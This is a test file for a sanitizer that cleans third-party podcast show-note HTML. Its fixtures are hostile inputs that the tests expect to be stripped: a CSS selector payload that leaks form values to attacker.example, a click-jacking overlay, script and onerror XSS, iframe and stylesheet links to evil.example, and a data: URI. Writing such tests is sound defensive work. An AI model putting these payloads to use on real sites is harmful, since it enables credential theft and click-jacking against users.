// SPDX-License-Identifier: AGPL-3.0-or-later
// SPDX-FileCopyrightText: 2026 The Mosaicast Authors

import { describe, expect, it } from 'vitest';

import { sanitizeFeedHtml } from './sanitize';

/**
 * Feed HTML is the only markup on the site that arrives from a third party and is inserted as markup.
 * DOMPurify's defaults stop script execution and permit styling; with `style-src 'unsafe-inline'` in the
 * policy — which the plugin UI contract requires — that made a podcast host's show notes a working
 * stylesheet on the episode page.
 */
describe('Feed HTML sanitizer', () => {
  it('keeps what show notes are actually made of', () => {
    const html = sanitizeFeedHtml(
      '<p>Notes with <strong>bold</strong>, <em>italics</em> and a ' +
        '<a href="https://example.com/x" title="t">link</a>.</p>' +
        '<ul><li>one</li><li>two</li></ul><img src="https://cdn.example/a.png" alt="art">',
    );

    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('href="https://example.com/x"');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('src="https://cdn.example/a.png"');
    expect(html).toContain('alt="art"');
  });

  it('strips a <style> element, which is the exfiltration and click-jacking vector', () => {
    // `input[value^="a"]{background-image:url(https://attacker/a)}` reads rendered form values one character
    // at a time, and `img-src` allows any https: origin because artwork comes from arbitrary feed hosts — so
    // the request carrying the stolen character is permitted. Nothing here needs a stylesheet.
    const html = sanitizeFeedHtml(
      '<style>input[value^="a"]{background-image:url(https://attacker.example/a)}</style><p>Notes</p>',
    );

    expect(html).not.toContain('<style');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('<p>Notes</p>');
  });

  it('strips a style attribute, so no element can be positioned over the page', () => {
    const html = sanitizeFeedHtml(
      '<div style="position:fixed;inset:0;z-index:9999">overlay</div><b style="color:red">x</b>',
    );

    expect(html).not.toContain('style=');
    expect(html).not.toContain('position:fixed');
  });

  it('still blocks script execution, as the defaults did', () => {
    const html = sanitizeFeedHtml(
      '<script>alert(1)</script><img src=x onerror="alert(1)"><a href="javascript:alert(1)">x</a>',
    );

    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('javascript:');
  });

  it('drops embedding elements a feed has no business supplying', () => {
    const html = sanitizeFeedHtml(
      '<iframe src="https://evil.example"></iframe><object data="x"></object>' +
        '<form action="/x"><input name="p"></form><link rel="stylesheet" href="https://evil.example/s.css">',
    );

    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<object');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<link');
  });

  it('refuses a data: URI in an href', () => {
    expect(sanitizeFeedHtml('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>')).not.toContain('data:');
  });

  it('is empty for absent input rather than throwing', () => {
    expect(sanitizeFeedHtml(null)).toBe('');
    expect(sanitizeFeedHtml(undefined)).toBe('');
    expect(sanitizeFeedHtml('')).toBe('');
  });
});
